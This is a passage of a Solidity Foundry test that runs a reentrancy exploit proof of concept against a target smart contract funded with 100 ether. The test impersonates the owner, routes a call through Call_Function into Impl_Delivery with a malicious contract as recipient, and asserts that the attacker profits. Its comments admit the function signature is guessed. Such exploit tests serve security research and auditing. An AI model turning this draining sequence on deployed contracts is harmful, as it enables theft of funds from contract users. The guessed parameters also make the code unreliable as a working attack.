        require(success2, "Transfer to malicious failed");
        vm.stopPrank();

        // Give the contract some ETH to drain
        deal(TARGET, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Exploit sequence
        // We need to trigger the vulnerable Impl_Delivery() function
        // Since we don't have the exact signature, we'll try common patterns
        // Based on the name, it might be a delivery/swap function

        // First, let's check if we can call Impl_Delivery directly
        bool success;
        bytes memory data;

        // Try calling Impl_Delivery with the malicious contract as recipient
        // We'll need to guess the parameters - common pattern: (address recipient, uint amount)
        // The malicious contract's fallback will trigger reentrancy

        // Store initial balances
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 contractBalance = TARGET.balance;

        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Initial contract balance:", contractBalance);

        // Set up the malicious contract with target address
        malicious.setTarget(TARGET);

        // Try to trigger the vulnerable function
        // We need to impersonate owner to use Call_Function
        (, bytes memory ownerData) = TARGET.call(abi.encodeWithSignature("owner()"));
        address tokenOwner = abi.decode(ownerData, (address));

        vm.startPrank(tokenOwner);

        // Create call data for Impl_Delivery - guessing signature
        // Common vulnerability: function Impl_Delivery(address to, uint amount)
        bytes memory callData = abi.encodeWithSignature(
            "Impl_Delivery(address,uint256)", 
            address(malicious), 
            1 ether
        );

        // Use Call_Function to call Impl_Delivery
        (bool callSuccess, ) = TARGET.call(abi.encodeWithSignature(
            "Call_Function(address,uint256,bytes)",
            TARGET, // address to call
            0,      // value to send
            callData // data - calling Impl_Delivery
        ));
        require(callSuccess, "Call_Function failed");

        vm.stopPrank();

        // Check final balances
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final contract balance:", TARGET.balance);

        // The oracle checks if attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
